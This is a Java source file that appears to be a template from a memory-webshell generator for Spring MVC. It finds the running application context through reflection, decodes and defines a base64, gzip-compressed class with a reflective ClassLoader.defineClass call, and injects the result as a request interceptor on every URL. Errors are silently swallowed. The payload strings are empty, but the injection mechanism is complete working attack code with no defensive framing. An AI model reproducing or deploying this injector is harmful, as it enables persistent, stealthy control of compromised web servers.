package jmg.core.template;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.zip.GZIPInputStream;

public class SpringMVCInterceptorInjectorTpl {

    public String getUrlPattern() {
        return "/*";
    }


    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }


    public SpringMVCInterceptorInjectorTpl() throws Exception {
        Object context = getContext();
        Object interceptor = getInterceptor();
        addInterceptor(context, interceptor);

    }

    public Object getContext() throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Object context = null;
        try {
            Object requestAttributes = invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
            Object httprequest = invokeMethod(requestAttributes, "getRequest");
            Object session = invokeMethod(httprequest, "getSession");
            Object servletContext = invokeMethod(session, "getServletContext");
            context = invokeMethod(classLoader.loadClass("org.springframework.web.context.support.WebApplicationContextUtils"), "getWebApplicationContext", new Class[]{classLoader.loadClass("javax.servlet.ServletContext")}, new Object[]{servletContext});
        } catch (Exception e) {
        }

        if (context == null) {
            try {
                LinkedHashSet applicationContexts = (LinkedHashSet) getFV(classLoader.loadClass("org.springframework.context.support.LiveBeansView").newInstance(), "applicationContexts");
                Object applicationContext = applicationContexts.iterator().next();
                if (classLoader.loadClass("org.springframework.web.context.WebApplicationContext").isAssignableFrom(applicationContext.getClass())) {
                    context = applicationContext;
                }
            } catch (Exception ignored) {
            }
        }
        return context;
    }

    private Object getInterceptor() throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Object interceptor = null;
        try {
            interceptor = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                interceptor = clazz.newInstance();
            } catch (Throwable tt) {
            }
        }
        return interceptor;
    }

    public void addInterceptor(Object context, Object interceptor) {
        try {
            Object abstractHandlerMapping = invokeMethod(context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) getFV(abstractHandlerMapping, "adaptedInterceptors");
            adaptedInterceptors.add(interceptor);
        } catch (Exception ignored) {
        }
    }


    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    synchronized void setFV(Object var0, String var1, Object val) throws Exception {
        getF(var0, var1).set(var0, val);
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }


    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
